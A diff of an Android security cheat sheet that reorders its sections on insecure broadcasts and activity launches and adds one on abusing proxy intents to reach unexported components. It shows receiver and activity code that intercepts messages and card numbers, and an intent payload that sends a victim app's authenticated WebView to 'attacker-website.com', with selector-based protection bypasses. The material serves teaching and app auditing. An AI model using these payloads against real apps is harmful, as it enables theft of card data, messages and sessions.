@@ -121,85 +121,6 @@ You can control an app's position in the list using the `android:priority="num"`
 
 # Security issues
 
-## Insecure broadcasts
-
-If an app uses implicit intents to deliver a broadcast you can register a broadcast receiver with the same action and intercept a user's broadcast from a different app. For example, suppose a messaging service requests new messages from the server and passes them to a broadcast receiver that is responsible for displaying them on the user's screen:
-
-```java
-Intent intent = new Intent("com.victim.messenger.IN_APP_MESSAGE");
-intent.putExtra("from", id);
-intent.putExtra("text", text);
-sendBroadcast(intent);
-```
-
-Since implicit broadcasts are delivered to each receiver registered on the device, across all apps, you can register the following broadcast receiver to intercept a user's broadcast:
-
-- `AndroidManifest.xml`
-
-    ```xml
-    <receiver android:name=".EvilReceiver">
-        <intent-filter>
-            <action android:name="com.victim.messenger.IN_APP_MESSAGE" />
-        </intent-filter>
-    </receiver>
-    ```
-
-- `EvilReceiver.java`
-
-    ```java
-    public class EvilReceiver extends BroadcastReceiver {
-        public void onReceive(Context context, Intent intent) {
-            if ("com.victim.messenger.IN_APP_MESSAGE".equals(intent.getAction())) {
-                // log intercepted data
-                Log.d("evil", "From: " + intent.getStringExtra("from"));
-                Log.d("evil", "Text: " + intent.getStringExtra("text"));
-            }
-        }
-    }
-    ```
-
-## Insecure activity launches
-
-If an app uses implicit intents with certain private data to launch activities you can start to handle the same actions to intercept the private data. For example, suppose a banking app uses an implicit intent with card data to launch an activity:
-
-```xml
-<activity android:name=".AddCardActivity">
-    <intent-filter>
-        <action android:name="com.victim.ADD_CARD_ACTION" />
-        <category android:name="android.intent.category.DEFAULT" />
-    </intent-filter>
-</activity>
-```
-
-```java
-Intent intent = new Intent("com.victim.ADD_CARD_ACTION");
-intent.putExtra("credit_card_number", num.getText().toString());
-intent.putExtra("holder_name", name.getText().toString());
-// ...
-startActivity(intent);
-```
-
-You can intercept card data as follows:
-
-- `AndroidManifest.xml`
-
-    ```xml
-    <activity android:name=".EvilActivity">
-        <intent-filter android:priority="999">
-            <action android:name="com.victim.ADD_CARD_ACTION" />
-            <category android:name="android.intent.category.DEFAULT" />
-        </intent-filter>
-    </activity>
-    ```
-
-- `EvilActivity.java`
-
-    ```java
-    Log.d("evil", "Number: " + getIntent().getStringExtra("credit_card_number"));
-    Log.d("evil", "Holder: " + getIntent().getStringExtra("holder_name"));
-    // ...
-    ```
-
 ## Abusing an activity's return value
 
 If an app launched an implicit intent using [startActivityForResult()](https://developer.android.com/reference/android/app/Activity#startActivityForResult%28android.content.Intent,%20int%29) an intercepting app can use [setResult()](https://developer.android.com/reference/android/app/Activity#setResult%28int,%20android.content.Intent%29) to pass data into the [onActivityResult()](https://developer.android.com/reference/android/app/Activity#onActivityResult%28int,%20int,%20android.content.Intent%29) of the app.
@@ -422,7 +343,184 @@ In this case, you can pass a name with path-traversal to the `getFileName()` met
 
 This allows you to bypass the borders of the `/data/data/com.victim/cache/` directory and write the file to the `/data/data/com.victim/lib-main/lib.so`. If the targeted app loads this native library, this leads to arbitrary code execution in the victim's context.
 
+## Access to arbitrary components
+
+Since the Intent is `Parcelable`, objects belonging to this class can be passed as extra data to another intent. This can be used to create a proxy component (activity, broadcast receiver or service) that take an embedded intent and pass it to dangerous methods such as `startActivity()` or `sendBroadcast()`. As a result, you can force an app to start an unexported component that can't be started directly from another app, or grant yourself access to app's content providers.
+
+For example, suppose, an app have an unexported activity that performs certain unsafe actions and an exported activity that is used as a proxy:
+
+- `AndroidManifest.xml`
+
+    ```xml
+    <activity android:name=".ProxyActivity" android:exported="true" />
+    <activity android:name=".AuthWebViewActivity" android:exported="false" />
+    ```
+
+- `ProxyActivity.java`
+
+    ```java
+    startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
+    ```
+
+- `AuthWebViewActivity.java`
+
+    ```java
+    webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
+    ```
+
+In this example the `AuthWebViewActivity` passes the user authentication session to the URL obtained from the url parameter.
+
+Export restrictions mean you can't directly access `AuthWebViewActivity` and a direct call throws the `java.lang.SecurityException` with the `Permission Denial: AuthWebViewActivity not exported from uid 1337` message:
+
+```java
+Intent intent = new Intent();
+intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
+intent.putExtra("url", "http://attacker-website.com/");
+// throws java.lang.SecurityException
+startActivity(intent);
+```
+
+However, you can force a victim to start `AuthWebViewActivity` on their own:
+
+```java
+Intent extra = new Intent();
+extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
+extra.putExtra("url", "http://attacker-website.com/");
+
+Intent intent = new Intent();
+intent.setClassName("com.victim", "com.victim.ProxyActivity");
+intent.putExtra("extra_intent", extra);
+startActivity(intent);
+```
+
+There are no security violations because the app has access to all of its own components. Therefore, it allows you to bypass the built-in restrictions of the Android.
+
+By itself, starting hidden components does not have much security impact and requires abuse of the functionality of the hidden components:
+- [Oversecured: Access to app protected components: Escalation of attacks via Content Providers](https://blog.oversecured.com/Android-Access-to-app-protected-components/#escalation-of-attacks-via-content-providers)
+- [Oversecured: Access to app protected components: Attacks on Android File Provider](https://blog.oversecured.com/Android-Access-to-app-protected-components/#attacks-on-android-file-provider)
+
+### Access to arbitrary components via WebView
+
+{% embed url="https://0xn3va.gitbook.io/cheat-sheets/android-application/webview#access-to-arbitrary-components" %}
+
+### Bypass protection
+
+Developers can implement a filtering of received intents and [explicitly set a component to handle the intent](https://developer.android.com/reference/android/content/Intent#setComponent(android.content.ComponentName)) to `null`:
+
+```java
+intent.setComponent(null);
+```
+
+In this case, you can bypass the app's explicit intent protection by specifying an unexported component via a [selector](https://developer.android.com/reference/android/content/Intent#setSelector(android.content.Intent)):
+
+```java
+Intent intent = new Intent();
+intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
+intent.putExtra("url", "http://attacker-website.com/");
+```
+
+The selector will be used when trying to find entities that can handle the Intent, instead of the main contents of the Intent.
+
+However, developers can explicitly set a selector to `null`:
+
+```java
+intent.setComponent(null);
+intent.setSelector(null);
+```
+
+Even so, you can create an implicit intent to match the `intent-filter` of some unexported activity:
+
+```xml
+<activity android:name=".AuthWebViewActivity" android:exported="false">
+    <intent-filter>
+        <action android:name="android.intent.action.VIEW" />
+        <category android:name="android.intent.category.DEFAULT" />
+        <data android:scheme="victim" android:host="secure_handler" />
+    </intent-filter>
+</activity>
+```
+
+## Insecure activity launches
+
+If an app uses implicit intents with certain private data to launch activities you can start to handle the same actions to intercept the private data. For example, suppose a banking app uses an implicit intent with card data to launch an activity:
+
+```xml
+<activity android:name=".AddCardActivity">
+    <intent-filter>
+        <action android:name="com.victim.ADD_CARD_ACTION" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+```
+
+```java
+Intent intent = new Intent("com.victim.ADD_CARD_ACTION");
+intent.putExtra("credit_card_number", num.getText().toString());
+intent.putExtra("holder_name", name.getText().toString());
+// ...
+startActivity(intent);
+```
+
+You can intercept card data as follows:
+
+- `AndroidManifest.xml`
+
+    ```xml
+    <activity android:name=".EvilActivity">
+        <intent-filter android:priority="999">
+            <action android:name="com.victim.ADD_CARD_ACTION" />
+            <category android:name="android.intent.category.DEFAULT" />
+        </intent-filter>
+    </activity>
+    ```
+
+- `EvilActivity.java`
+
+    ```java
+    Log.d("evil", "Number: " + getIntent().getStringExtra("credit_card_number"));
+    Log.d("evil", "Holder: " + getIntent().getStringExtra("holder_name"));
+    // ...
+    ```
+
+## Insecure broadcasts
+
+If an app uses implicit intents to deliver a broadcast you can register a broadcast receiver with the same action and intercept a user's broadcast from a different app. For example, suppose a messaging service requests new messages from the server and passes them to a broadcast receiver that is responsible for displaying them on the user's screen:
+
+```java
+Intent intent = new Intent("com.victim.messenger.IN_APP_MESSAGE");
+intent.putExtra("from", id);
+intent.putExtra("text", text);
+sendBroadcast(intent);
+```
+
+Since implicit broadcasts are delivered to each receiver registered on the device, across all apps, you can register the following broadcast receiver to intercept a user's broadcast:
+
+- `AndroidManifest.xml`
+
+    ```xml
+    <receiver android:name=".EvilReceiver">
+        <intent-filter>
+            <action android:name="com.victim.messenger.IN_APP_MESSAGE" />
+        </intent-filter>
+    </receiver>
+    ```
+
+- `EvilReceiver.java`
+
+    ```java
+    public class EvilReceiver extends BroadcastReceiver {
+        public void onReceive(Context context, Intent intent) {
+            if ("com.victim.messenger.IN_APP_MESSAGE".equals(intent.getAction())) {
+                // log intercepted data
+                Log.d("evil", "From: " + intent.getStringExtra("from"));
+                Log.d("evil", "Text: " + intent.getStringExtra("text"));
+            }
+        }
+    }
+    ```
+
 # References
 
 - [Android Developers: Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)
 - [Oversecured: Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
+- [Oversecured: Android Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
